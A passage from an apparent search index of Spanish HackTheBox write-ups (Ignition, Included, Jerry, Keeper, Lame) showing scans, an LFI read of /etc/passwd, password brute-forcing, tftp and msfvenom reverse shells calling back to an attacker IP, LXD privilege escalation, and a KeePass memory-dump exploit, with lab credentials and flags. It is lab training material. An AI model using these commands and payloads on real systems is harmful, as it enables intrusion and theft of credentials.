2","text":""},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#escalada-de-privilegios","title":"Escalada de privilegios","text":""},{"location":"Writeup-ctfs/HackTheBox/GoodGames/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 En esta secci\u00f3n, debes proporcionar un resumen de la m\u00e1quina para cuando tengas que volver a ella, puedas saber conocer de forma r\u00e1pida de que se trataba"},{"location":"Writeup-ctfs/HackTheBox/Ignition/","title":"Ignition","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 5 de enero de 2025 14:01 IP: 10.129.1.27</p>"},{"location":"Writeup-ctfs/HackTheBox/Ignition/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Ignition/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.1.27 -oG allports\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Ignition/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p80 -sCV 10.129.1.27 -oN targeed\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.14.2\n|_http-title: Did not follow redirect to http://ignition.htb/\n|_http-server-header: nginx/1.14.2\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>80/tcp open  http    nginx 1.14.2</li> </ul> </li> </ul> <p>Enumeracion web</p> <p>A\u00f1adimos el host iginition.htb</p> <pre><code>sudo nano /etc/hosts\n</code></pre> <p>Visitamos el sitio</p> <p></p> <p>Scripts nmap</p> <pre><code>\u276f sudo nmap --script=http-enum -sV -p80 10.129.1.27\n\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n| http-enum: \n|   /setup/: Potentially interesting folder\n|_  /soap/: Potentially interesting folder\n</code></pre> <pre><code>whatweb 10.129.1.27\n\nhttp://10.129.1.27 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], HttpOnly[PHPSESSID], IP[10.129.1.27], RedirectLocation[http://ignition.htb/], UncommonHeaders[content-security-policy-report-only,x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.14.2]\nhttp://ignition.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], HttpOnly[PHPSESSID], IP[10.129.1.27], Magento, Script[text&amp;#x2F;javascript,text/javascript,text/x-magento-init], Title[Home page], UncommonHeaders[content-security-policy-report-only,x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.14.2]\n</code></pre> <p>Fuzzing</p> <pre><code>\u276f gobuster dir -u http://ignition.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 25815]\n/contact              (Status: 200) [Size: 28673]\n/home                 (Status: 200) [Size: 25802]\n/media                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/media/]\n/0                    (Status: 200) [Size: 25803]\n/catalog              (Status: 302) [Size: 0] [--&gt; http://ignition.htb/]\n/admin                (Status: 200) [Size: 7092]\n/static               (Status: 301) [Size: 185] [--&gt; http://ignition.htb/static/]\n/Home                 (Status: 301) [Size: 0] [--&gt; http://ignition.htb/home]\n/cms                  (Status: 200) [Size: 25817]\n/checkout             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/checkout/cart/]\n/robots.txt           (Status: 200) [Size: 1]\n/robots               (Status: 200) [Size: 1]\n/setup                (Status: 301) [Size: 185] [--&gt; http://ignition.htb/setup/]\n/wishlist             (Status: 302) [Size: 0] [--&gt; http://ignition.htb/customer/account/login/referer/aHR0cDovL2lnbml0aW9uLmh0Yi93aXNobGlzdA%2C%2C/]\n/soap                 (Status: 200) [Size: 391]\n/rest                 (Status: 400) [Size: 52]\n/errors               (Status: 301) [Size: 185] [--&gt; http://ignition.htb/errors/]\n/opt                  (Status: 301) [Size: 185] [--&gt; http://ignition.htb/opt/]\n</code></pre> <p>Enumeramos /admin</p> <p></p> <p>En la pagina /setup encontramos la versi\u00f3n:</p> <p>Magento Version dev-2.4-develop </p> <p>Usamos un script en python para buscar la contrase\u00f1a de admin del panel de login:</p> <pre><code>\u276f python magentoBf.py http://ignition.htb/admin -u admin -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt\n\n[V] To Check: admin: qwerty123          \nCtrl-c was pressed. Do you really want to exit? y/n \n</code></pre> <p>User: admin</p> <p>Password: qwerty123</p> <p>Nota: Las pistas de HTBox decian que se podia hacer una busqueda de los passwords mas usados en 2024. Buscandolo en google encontramos (qwerty123)</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Ignition/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 No hay explotaci\u00f3n ni escalada de privilegios"},{"location":"Writeup-ctfs/HackTheBox/Ignition/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina f\u00e1cil. Tener presente leer todos los paneles (dashboard)  y home pages, ya que no he visto la flag del dashboard y he perdido mucho tiempo buscando maneras de acceder."},{"location":"Writeup-ctfs/HackTheBox/Included/","title":"Included","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 10 de enero de 2025 23:37 IP: 10.129.50.109</p>"},{"location":"Writeup-ctfs/HackTheBox/Included/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Included/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.50.109 -oG allports\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 63\n\n\u276f sudo nmap -sU 10.129.50.109\nPORT   STATE SERVICE REASON\n69/udp open|filtered  tftp\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Included/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p80 -sCV 10.129.50.109 -oN targeted\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n| http-title: Site doesnt have a title (text/html; charset=UTF-8).\n|_Requested resource was http://10.129.50.109/?file=home.php\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n\nsudo nmap -p80 --script=http-enum 10.129.50.109\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-10 23:52 CET\nNmap scan report for 10.129.50.109\nHost is up (0.086s latency).\n\nPORT   STATE SERVICE\n80/tcp open  http\n| http-enum: \n|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</li> </ul> </li> <li> <p>Enumeraci\u00f3n Web</p> <p></p> <p>Whatweb</p> <pre><code> whatweb 10.129.50.109\nhttp://10.129.50.109 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.50.109], RedirectLocation[http://10.129.50.109/index.php?file=home.php]\nhttp://10.129.50.109/index.php?file=home.php [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.50.109], RedirectLocation[http://10.129.50.109/?file=home.php], Title[301 Moved Permanently]\nhttp://10.129.50.109/?file=home.php [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.50.109]\n</code></pre> <p>Al ver la web, observamos en el navegador:</p> <pre><code>http://10.129.50.109/?file=home.php#\n</code></pre> <p>Provamos un LFI</p> <pre><code>http://10.129.50.109/?file=../../../../../etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false mike:x:1000:1000:mike:/home/mike:/bin/bash tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin \n</code></pre> <p>Buscamos en el fichero algun usuario valido:</p> <pre><code>cat passwd | grep /bin/bash:\n\nmike:x:1000:1000:mike:/home/mike:/bin/bash\n</code></pre> <p>Usuario : mike</p> <p>La pregunta de HTB nos pregunta que fichero de configuraci\u00f3n del servidor web nos permite hacer un movimiento lateral.</p> <p>Revisamos los archivos y probamos a listar el .htpasswd </p> <pre><code>mike:Sheffield19 \n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Included/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Included/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Una vez tenemos las credenciales de un usuario, podemos probar a conectarnos por tftp y subier una rever shell</p> <pre><code># Copiamos la rever shell en el mismo directorio que ejecutamos tftp (shell.php)\n\ntftp 10.129.50.109\nput shell.php\nexit\n</code></pre> <p>Como sabemos que el directorio por defecto de tftp es /var/lib/tftpboot, ejecutamos la rever desde alli:</p> <pre><code># Maquina atacanta\nnc -lvnp 4444\n\n\u276f curl 'http://10.129.50.109/?file=/var/lib/tftpboot/shell.php'\n\nObtenemos rever shell:\n\nwww-data@included:/$ su mike\n\n# Migramos a usuario mike con las credenciales anteriores\n\nmike@included:/$\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Included/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":""},{"location":"Writeup-ctfs/HackTheBox/Included/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Una vez como usuario mike</p> <pre><code>mike@included:/$ id\nuid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd)\nmike@included:/$ groups\nmike lxd\n</code></pre> <p>Nos encontramos dentro de nun contenedor LXD :</p> <p>LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.</p> <p>Seguimos los pasos del writeup</p> <p>Instalamos GO</p> <pre><code>sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools\n</code></pre> <p>Clonams la distro LXC Distribution Builder</p> <pre><code>git clone https://github.com/lxc/distrobuilder\ncd distrobuilder\nmake\n</code></pre> <p>Descargamos ALpine YAML file</p> <pre><code>mkdir -p $HOME/ContainerImages/alpine/\ncd $HOME/ContainerImages/alpine/\nwget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml\nsudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18\n\n\u276f ls\n\uf115 test  \ue60b alpine.yaml  \uf410 incus.tar.xz  \uf016 rootfs.squashfs\n\n\u276f python3 -m http.server 8000\n</code></pre> <p>En la maquina victima</p> <pre><code>mike@included:~$ wget http://10.10.16.103:8000/incus.tar.xz\nmike@included:~$ wget http://10.10.16.103:8000/rootfs.squashfs\n\nmike@included:~$ lxc image import incus.tar.xz rootfs.squashfs --alias alpine\n\nImage imported with fingerprint: e355934fd3991d51b0f31fcb1c8f986c464fbec5a577f83\nmike@included:~$ lxc image list\n+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+\n| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |\n+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+\n| alpine | e355934fd399 | no     | Alpinelinux 3.18 x86_64 (20250111_0008) | x86_64 | 2.95MB | Jan 11, 2025 at 12:15am (UTC) |\n+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+\nmike@included:~$ lxc init alpine privesc -c security.privileged=true\nCreating privesc\n&lt;st-root disk source=/ path=/mnt/root recursive=true\nDevice host-root added to privesc\nmike@included:~$ lxc start privesc\nmike@included:~$ lxc exec privesc /bin/sh\n~ # whoami\nroot\n~ # cd /mnt/root\n/mnt/root # ls\nbin             initrd.img.old  proc            tmp\nboot            lib             root            usr\ncdrom           lib64           run             var\ndev             lost+found      sbin            vmlinuz\netc             media           snap            vmlinuz.old\nhome            mnt             srv\ninitrd.img      opt             sys\n/mnt/root # cd root/\n/mnt/root/root # ls\nroot.txt\n/mnt/root/root # cat root.txt \nc693d9c7499d9f572ee375d4c14c7bcf\n</code></pre> <p>Flag : c693d9c7499d9f572ee375d4c14c7bcf</p>"},{"location":"Writeup-ctfs/HackTheBox/Included/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina resuelta con Writteup, ya que no conocia la explotacion de LXD"},{"location":"Writeup-ctfs/HackTheBox/Jerry/","title":"Jerry","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Windows</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 2 de diciembre de 2024 13:42</p> <p>\ud83c\udf10 IP: <code>10.10.10.95</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f \u276f sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allports\n\nPORT     STATE SERVICE    REASON\n8080/tcp open  http-proxy syn-ack ttl 127\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p8080 -sCV --script=http-enum 10.10.10.95 -oN targeted\nPORT     STATE SERVICE VERSION\n8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1\n| http-enum: \n|   /examples/: Sample scripts\n|   /manager/html/upload: Apache Tomcat (401 Unauthorized)\n|   /manager/html: Apache Tomcat (401 Unauthorized)\n|_  /docs/: Potentially interesting folder\n|_http-server-header: Apache-Coyote/1.1\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</li> </ul> </li> <li> <p>Enumeracion Web (8080)</p> <p></p> </li> </ul> <p>Whateweb</p> <pre><code>whatweb 10.10.10.95:8080\nhttp://10.10.10.95:8080 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache-Coyote/1.1], IP[10.10.10.95], Title[Apache Tomcat/7.0.88]\n</code></pre> <p>Revisando la web vemos el apartado \u201cServer status\u201d y al acceder aparece:</p> <p></p> <p>Con dos credenciales : tomcat/s3cret</p> <p>Probamos a acceder:</p> <p></p> <p>Vemos que al acceder, podemos subir ficheros .war</p>"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Creamos un payload con msfvenom: </p> <pre><code>msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.16.9 lport=4444 -f war &gt; shell.war\n</code></pre> <p>Subimos el fichero, nos ponemos a la escucha con netcat y accedemos a la web /shell.war</p> <p>Obtenemos la rever:</p> <p></p> <p>Accedemos a los directorios de Administrador :</p> <pre><code>C:\\Users\\Administrator\\Desktop\\flags&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 0834-6C04\n\n Directory of C:\\Users\\Administrator\\Desktop\\flags\n\n06/19/2018  06:09 AM    &lt;DIR&gt;          .\n06/19/2018  06:09 AM    &lt;DIR&gt;          ..\n06/19/2018  06:11 AM                88 2 for the price of 1.txt\n               1 File(s)             88 bytes\n               2 Dir(s)   2,296,217,600 bytes free\n\nC:\\Users\\Administrator\\Desktop\\flags&gt;type *.txt \ntype *.txt\nuser.txt\n7004dbcef0f854e0fb401875f26ebd00\n\nroot.txt\n04a8b36e1545a455393d067e772fe90e\nC:\\Users\\Administrator\\Desktop\\flags&gt;\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 No hay escalada de privilegios"},{"location":"Writeup-ctfs/HackTheBox/Jerry/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Keeper/","title":"Keeper","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 30 de enero de 2025 21:29</p> <p>\ud83c\udf10 IP: <code>10.10.11.227</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Sistema</p> <pre><code>whichSystem.py 10.10.11.227\n\n    10.10.11.227 (ttl -&gt; 63): Linux\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.11.227 -oG targeted\n\nPORT   STATE SERVICE REASON\n22/tcp open  ssh     syn-ack ttl 63\n80/tcp open  http    syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>sudo nmap -p22,80 -sCV 10.10.11.227 -oN targeted\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)\n|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3</li> <li>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3</li> </ul> </li> <li> <p>Enumeracion web</p> <p></p> <p></p> </li> </ul> <p>A\u00f1adimos al /etc/host : tickets.keeper.htb</p> <p></p> <p>Vemos que usa \u201cRequest Tracker\u201d</p> <p>Buscamos las credenciales por defecto : root/password</p> <p>Nos logamos en el panel</p> <p></p> <p>Vamos a la seccion Usuarios y vemos</p> <p>Usuario: lnorgaard</p> <p></p> <p>Probamos a acceder por SSH : Explotacion 1</p>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 Probamos diferentes accesos"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<pre><code>ssh lnorgaard@ssh 10.10.11.227\n\nThe authenticity of host '10.10.11.227 (10.10.11.227)' can't be established.\nED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.10.11.227' (ED25519) to the list of known hosts.\nlnorgaard@10.10.11.227's password: \nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\nYou have mail.\nLast login: Tue Aug  8 11:31:22 2023 from 10.10.14.23\nlnorgaard@keeper:~$ ls\nRT30000.zip  user.txt\nlnorgaard@keeper:~$ cat user.txt \n791774e6eca0481f1a79d0919f468b45\nlnorgaard@keeper:~$ \n</code></pre> <p>Descargamos el fichero RT30000.zip</p> <pre><code># Maquina atacante\n\n\u276f scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip ../content\n\u276f ls\n\uf410 RT30000.zip\n\u276f unzip RT30000.zip\nArchive:  RT30000.zip\n  inflating: KeePassDumpFull.dmp     \n extracting: passcodes.kdbx          \n\u276f ls\n\uf489 KeePassDumpFull.dmp  \uf489 passcodes.kdbx  \uf410 RT30000.zip\n</code></pre> <p>Vemos que es posible extraer la contrase\u00f1a maestra de KeePassDumpFUll.dmp debido al CVE-2023-32784  </p> <p>Buscamos un exploot</p>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#explotacion-2","title":"Explotaci\u00f3n 2","text":"<pre><code>gitclone https://github.com/dawnl3ss/CVE-2023-32784.git\ncd CVE-2023-32784\npython3 poc.py KeePassDumpFull.dmp\n\n\u25cfMdgr\u25cfd med fl\u25cfde\n</code></pre> <p>Si buscamos el resultado en google aparece que es un postre de dinamarca:</p> <p>r\u00f8dgr\u00f8d med fl\u00f8de</p> <p>Instalamos KeePass y abrimos el fichero con la contrase\u00f1a</p> <p></p> <p></p> <p>El formato es un formato de ppk (Putty Private Key)</p> <p>Convertimos el formato a id_rsa</p> <pre><code>puttygen private.ppk -O private-openssh -o id_rsa\nchmod 600 id_rsa\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Accedemos con las credenciales encontradas"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<pre><code> ssh -i id_rsa root@10.10.11.227\n root@keeper:~# ls\n root@keeper:~# cat root.txt \nce5c3b996b4b28e54bce317a959be019\nroot@keeper:~# \n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Keeper/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina facil que me ha dado trabajo encontrar que era formato ppk y convertirlo en id_rsa"},{"location":"Writeup-ctfs/HackTheBox/Lame/","title":"Lame","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 25 de enero de 2025 21:13</p> <p>\ud83c\udf10 IP: <code>10.10.10.3</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Lame/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Reconocimiento general   <p>Que maquina es</p> <pre><code>whichSystem.py 10.10.10.3\n\n    10.10.10.3 (ttl -&gt; 63): Linux\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Lame/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv 10.10.10.3 -oG targeted\n\nPORT     STATE SERVICE      REASON\n21/tcp   open  ftp          syn-ack ttl 63\n22/tcp   open  ssh          syn-ack ttl 63\n139/tcp  open  netbios-ssn  syn-ack ttl 63\n445/tcp  open  microsoft-ds syn-ack ttl 63\n3632/tcp open  distccd      syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Lame/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p21,22,139,445,3632 -sCV 10.10.10.3 -oN targeted\n\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to 10.10.16.13\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      vsFTPd 2.3.4 - secure, fast, stable\n|_End of status\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: \n|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)\n3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n|_clock-skew: mean: 2h30m19s, deviation: 3h32m08s, median: 18s\n| smb-os-discovery: \n|   OS: Unix (Samba 3.0.20-Debian)\n|   Computer name: lame\n|   NetBIOS computer name: \n|   Domain name: hackthebox.gr\n|   FQDN: lame.hackthebox.gr\n|_  System time: 2025-01-26T10:03:49-05:00\n|_smb2-time: Protocol negotiation failed (SMB2)\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>21/tcp   open  ftp         vsftpd 2.3.4</li> <li>22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1</li> <li>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</li> <li>445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)</li> <li>3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))</li> </ul> </li> <li> <p>Enumeramos el puerto 21</p> <p>Buscamos vulnerabilidades para la version vsftpd 2.3.4</p> <pre><code>searchsploit vsftpd 2.3.4\n\nvsftpd 2.3.4 - Backdoor Command Execution                                                                                                               | 